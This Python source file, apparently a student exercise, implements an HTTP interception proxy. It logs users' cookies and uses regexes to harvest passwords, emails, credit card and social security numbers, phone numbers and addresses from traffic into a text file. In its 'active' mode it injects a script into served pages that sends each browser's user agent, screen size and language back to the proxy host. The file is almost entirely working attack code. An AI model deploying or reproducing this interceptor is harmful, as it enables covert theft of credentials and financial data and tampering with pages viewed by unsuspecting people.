import socket
import signal
import threading
from urllib.parse import urlparse, parse_qsl
import sys
import re
import logging


def get_fields(headers):

  fields = {}
  
  for header in headers:
    index = header.find(' ')
    # drop the ':' character
    field = header[:index-1]
    # get the value of the field
    value = header[index+1:]
    # add field, value to fields
    if field not in fields:
      fields[field] = list()
    fields[field].append(value)
  
  return fields


def recv_http(sock):
  
  request_length = 4096 
  content_length = -1
  fields = {}
  data = b''
  content = b''
  headers = [] 

  # read request/status line and headers
  while True:
    received = sock.recv(request_length)
    if len(received) == 0:
      return None # error headers not found
    data += received
    # find the end of the the headers
    end = data.find(b'\r\n\r\n')
    if end != -1:
      headers = re.split('\r\n',  data[:end+2].decode())
      # store the request line
      request = headers[0]
      # get fields and skip request/status line
      fields = get_fields(headers[1:-1]) 
      # check for http get request
      if request.split(' ')[0] == 'GET':
        return headers[:-1], fields, data, ''
      else:
        break
 
  # store the post/response message content length 
  if 'Content-Length' in fields:
    content_length = int(fields['Content-Length'][0])
    
  # store remaining content
  if end+4 < len(data):
    content += data[end+4:]
    # check if all content read
    if len(content) == content_length:
      return headers[:-1], fields, data, content
 
  # read body of request/response 
  while True:
    received = sock.recv(request_length)
    if len(received) == 0:
      break
    data += received 
    # update length of content received 
    content += received
    # check if all content has been read
    if len(content) == content_length:
      break
  return headers[:-1], fields, data, content


def get_info_qs(qs, info, regexes):

  # parse query string into a dictionary
  query = dict(parse_qsl(qs))
  
  # store values from common query parameters
  for param in info.keys() & query.keys():
    info[param].add(query[param])
      
  # store values that match regex patterns 
  for param, pattern in regexes.items():
    matches = re.findall(pattern, qs)
    if len(matches) > 0:
      for match in matches:
        info[param].add(match)  
       
 
def get_info(data, info, regexes):
  
  # store values that match regex patterns 
  for param, pattern in regexes.items():
    matches = re.findall(pattern, data)
    if len(matches) > 0:
      for match in matches:
        info[param].add(match)  


def client_thread(logger, mode, client_sock, proxy_ip, proxy_port):
  # all possible params looked for 
  params = set(['firstname', 'lastname', 'birthday', 'year', 'email', 'password', 
                'address', 'credit-card', 'social-security', 'phone', 
                'city', 'state', 'zip'])

  # regex patterns for users data
  regexes = {'email': '[a-zA-Z0-9]+(?:[\.\-_][a-zA-Z0-9]+)*@[a-zA-Z0-9]+\.[a-zA-Z]{3}',
              'year': '(?:\d{1,2}[-\./\s]\d{1,2}[-\./\s]\d{4})|(?:\d{4}[-\./\s]\d{1,2}[-\./\s]\d{1,2})',
              'address': '\d{1,3}.?\d{0,3}\s[a-zA-Z]{2,30}\s[a-zA-Z]{2,15}',
              'credit-card': '\d{4}(?:[-\s]\d{4}){3}',
              'social-security': '\d{3}[-\s]\d{2}[-\s]\d{4}',
              'phone': '(?:(?:1-)?\d{3}-\d{3}-\d{4})|(?:1?\(\d{3}\)\d{3}-\d{4})',
              'zip': '\d{5}(?:[-\s]\d{4})?'}  
  info = dict([(param, set()) for param in params])  

 
  # get the request from browser
  request_length = 4096
  #request = client_sock.recv(request_length)
  headers, fields, request, content = recv_http(client_sock) 

  url = headers[0].split(' ')[1]
  parsed = urlparse(url)
 
  # log cookie information
  if 'Set-Cookie' in fields:
    logger.info('Set-Cookie: ' +  ','.join(fields['Set-Cookie']))
 
  if 'Cookie' in fields:
    logger.info('Cookie: ' + ','.join(fields['Cookie']))

  # check for injected javascript request:
  if len(parsed.netloc) == 0 and len(parsed.query) > 0:
    query =  dict(parse_qsl(parsed.query))
    # check if all params are present in request
    if all(param in query for param in ['user-agent', 'screen', 'lang']):
      info2 = open("info_2.txt", "w")
      # store parameters to file
      for param, val in query.items():
        info2.write(param + ": " + val + "\n")
      info2.close()
  
  if parsed.scheme == 'http':

    # check for info in client content 
    if len(content) > 0:
      # check content type of client request
      if 'Content-Type' in fields:
        # get mime type of content
        content_type = fields['Content-Type'][0]
        # check if content type is a query string
        if content_type == 'application/x-www-form-urlencoded':
          # get info found in query string
          get_info_qs(content.decode(), info, regexes)
        elif content_type.split('/')[0] == 'text':
          # get info found in text  
          get_info(data.decode(), info, regexes)   

    # check for info in url
    if len(parsed.query) > 0:
      # get info found in query string
      get_info_qs(parsed.query, info, regexes)

    port = 80
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    server_sock.connect((parsed.netloc, port))
    server_sock.sendall(request)
    
    #data, headers, fields, content = recv_http(server_sock)
    headers, fields, data, content = recv_http(server_sock)
   
    # log cookie information
    if 'Set-Cookie' in fields:
      logger.info('Set-Cookie: ' +  ','.join(fields['Set-Cookie']))
 
    if 'Cookie' in fields:
      logger.info('Cookie: ' + ','.join(fields['Cookie']))

    if 'Content-Type' in fields:
      # get mime type of content
      content_type = fields['Content-Type'][0]
      # check if type is text
      if content_type.split('/')[0] == 'text': 
        # update info found in content    
        get_info(data.decode(), info, regexes)
 
    # log all info found 
    for param, vals in info.items():
      if len(vals) > 0:
        logger.info(param + ': ' + ','.join(vals)) 
    
    # check mode being used
    if mode == "active":
      # inject script
      script_format = '''<script>
var http = new XMLHttpRequest();
var resolution = screen.width + "x" + screen.height;
var url = "http://{ip}:{port}/?user-agent=" + navigator.userAgent + "&screen=" + resolution + "&lang="+navigator.language;
http.open("GET", url, true);
http.send();
</script>
'''
      # insert proxy ip and port to script
      script = script_format.format(ip = proxy_ip, port = proxy_port)
      html_end = data.find(b'</html>')
      if html_end != -1:
        # inject script before closing html tag
        injected = data[:html_end] + script.encode() + data[html_end:]
        if 'Content-Length' in fields:
          # calculate length of content
          content_length = len(content)+len(script.encode())
          updated_field = b'Content-Length: ' + str(content_length).encode()
          length_pos = injected.find(b'Content-Length:')
          last_pos = injected.find(b'\r\n', length_pos)
          # add updated field to data
          injected = injected[:length_pos] + updated_field + injected[last_pos:] 
        # overwrite the original data
        data = injected
    # send data to client 
    if len(data) != 0:
      client_sock.send(data) 
  return


def shutdown(signum, frame):
  global proxy_sock
  main_thread = threading.currentThread() # Wait for all clients to exit
  for t in threading.enumerate():
    if t is main_thread:
      continue
    t.join()
    proxy_sock.close()
  sys.exit(0)  



logger = logging.getLogger("proxy")
handler = logging.FileHandler("info_1.txt", mode = "w")
logger.addHandler(handler)
logger.setLevel(logging.INFO)

if len(sys.argv) != 5:
  print("missing arguments")
  sys.exit(0)

mode = sys.argv[2]
ip = sys.argv[3]
port = sys.argv[4]

# shutdown on Ctrl+C
#signal.signal(signal.SIGINT, shutdown) 

# Create a TCP socket
proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Re-use the socket
proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# bind the socket to a public host, and a port   
proxy_sock.bind((ip, int(port)))
    
proxy_sock.listen(10) # become a server socket
clients = {}

print(mode)
print(ip)
print(port)

while True:
  # establish the connection
  (client_sock, client_address) = proxy_sock.accept() 
    
  d = threading.Thread(target = client_thread, args=(logger, mode, client_sock, ip, port))
  d.setDaemon(True)
  d.start()


  
